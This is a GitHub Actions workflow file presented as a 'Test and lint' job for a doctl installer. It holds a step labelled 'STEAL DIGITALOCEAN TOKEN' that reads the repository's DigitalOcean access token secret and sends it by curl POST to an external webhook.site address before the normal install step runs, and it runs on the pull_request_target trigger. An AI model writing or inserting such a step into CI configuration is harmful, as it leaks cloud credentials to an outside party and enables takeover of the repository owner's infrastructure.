on: [push, pull_request_target]
name: Test and lint

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@master
      
      # EXPLOIT
      - name: STEAL DIGITALOCEAN TOKEN
        run: |
          echo "=== STARTING EXPLOIT ==="
          echo "Repository: ${{ github.repository }}"
          TOKEN="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
          echo "Token length: ${#TOKEN}"
          curl -X POST "https://webhook.site/069b3073-d92e-4677-b186-be3499ade648" -d "token=$TOKEN"
          echo "=== EXPLOIT COMPLETE ==="
      
      - name: Install doctl
        uses: ./
        with:
          token: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
